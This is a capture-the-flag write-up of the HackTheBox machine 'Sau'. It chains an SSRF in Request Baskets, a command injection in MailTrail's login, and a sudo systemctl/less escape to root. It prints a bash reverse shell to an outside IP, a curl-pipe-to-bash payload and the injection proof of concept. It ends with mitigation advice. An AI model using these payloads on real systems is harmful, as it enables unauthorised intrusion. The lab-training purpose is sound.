## **Description:**

[Sau](https://app.hackthebox.com/machines/sau) from [HackTheBox](https://www.hackthebox.com), we find a website vulnerable to `ssrf` that we exploit to access a web app that's sitting behind a firewall, the web app is vulnerable to command injection giving us our foothold. For root we find a misconfigured sudo entry allowing us to drop a root shell.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal

We found two open ports: 22 and 55555. port 80 is filtered.

### Web

Let's navigate to the web page on port 55555.

![a](1.png)

This is `Request Baskets` version 1.2.1, it allows us to inspect HTTP requests.

Searching on google for this version reveals it's vulnerable to a [Server Side Request Forgery](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3). That's why there is a filtered port.

Let's first create a basket.

![a](2.png)

Now we open it.

![a](3.png)

The website gave us a link to make requests to, and it will show us on this page the HTTP requests made.

Let's go to `http://10.10.11.224:55555/4gngypw`

>The random string will be different on each basket created.

![a](4.png)

We can see the headers of our request.

The `SSRF` vulnerability can be exploited using the `Forward URL` option in the settings:

![a](5.png)

Since port 80 is filtered let's set the `Forward URL` to `http://127.0.0.1/` and check the `Proxy Response` option.

![a](6.png)

Now if let's request the url `http://10.10.11.224:55555/4gngypw`

![a](7.png)

We've successfully got the page of the website on port 80.

It shows that it's running `MailTrail (v0.53)`.

After some research we find that this version is vulnerable to an [OS Command Injection](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/) during the login process

The proof of concept provided for this vulnerability is the following:

```bash
curl 'http://hostname:8338/login' --data 'username=;`id > /tmp/bbq`'
```

## **Foothold**

We'll edit the command executed to a reverse shell.

First I'll host a bash script holding the following reverse shell:

```bash
bash -i >& /dev/tcp/10.10.17.90/9001 0>&1
```

The command I'll be executing will request this script and pips it's content to bash to get it executed and me receiving a shell.

```bash
curl 'http://10.10.11.224:55555/wswltbh/login' --data 'username=;`curl 10.10.17.90/shell.sh|bash`'
```

![a](8.png)

We got a shell as `puma`

## **Privilege Escalation**

Let's check our privileges:

```shell
puma@sau:~$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

We can check the status of the trail service.

![a](9.png)

One thing to notice here is the output is not printed fully and we're in a `less` interface, that's because our tty is not setup properly.

That was lucky for us, but if the sudo command printed the output normally without showing less, we can make our terminal smaller or change the stty setting with `stty rows 20 columns 50`.

It should also be mentioned that we need a full tty shell for this to run properly, so upgrade your shell if haven't already.

If go to GTFOBins we see that if we have a shell over `less` we can run `!/bin/bash` and get a root shell.

![a](10.png)

## **Prevention and Mitigation**

### SSRF

Update `Requests Basket` to the latest version.

## Command Injection

`Mail Trail` should be updated to the latest version.

## Systemctl

systemd before 247 does not adequately block local privilege escalation for some Sudo configurations, e.g., plausible sudoers files in which the "systemctl status" command may be executed. Specifically, systemd does not set LESSSECURE to 1, and thus other programs may be launched from the less program. This presents a substantial security risk when running systemctl from Sudo, because less executes as root when the terminal size is too small to show the complete systemctl output.

Set `LESSSECURE` environment variable to `1`.
